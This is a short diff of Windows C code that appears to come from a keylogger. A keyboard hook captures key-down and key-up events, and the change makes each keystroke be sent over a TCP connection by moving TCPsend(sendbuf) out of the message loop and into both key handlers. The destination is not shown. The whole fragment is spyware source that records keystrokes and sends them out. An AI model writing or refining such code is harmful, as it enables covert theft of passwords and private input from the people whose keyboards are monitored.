@@ -78,7 +78,6 @@ int __cdecl main(int argc, char **argv) {
 	while (GetMessage(&msg, NULL, 0, 0)){
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
-		TCPsend(sendbuf);
 
 	}
 	//cleanup
@@ -116,7 +115,7 @@ LRESULT CALLBACK KeyboardProc(UINT uMsg, WPARAM wParam, LPARAM lParam)
 				printf("in keydown msg\n");
 				break;
 			}
-			//TCPsend(sendbuf, ConnectSocket);
+			TCPsend(sendbuf);
 			break;
 		case WM_KEYUP:
 			switch ((unsigned int)kbdStruct.vkCode)
@@ -141,7 +140,7 @@ LRESULT CALLBACK KeyboardProc(UINT uMsg, WPARAM wParam, LPARAM lParam)
 				printf("in keyup msg\n");
 				break;
 			}
-			//TCPsend(sendbuf, ConnectSocket);
+			TCPsend(sendbuf);
 			break;
 		default:
 			//printf("in other msg%d, key %d\n", uMsg, wParam);
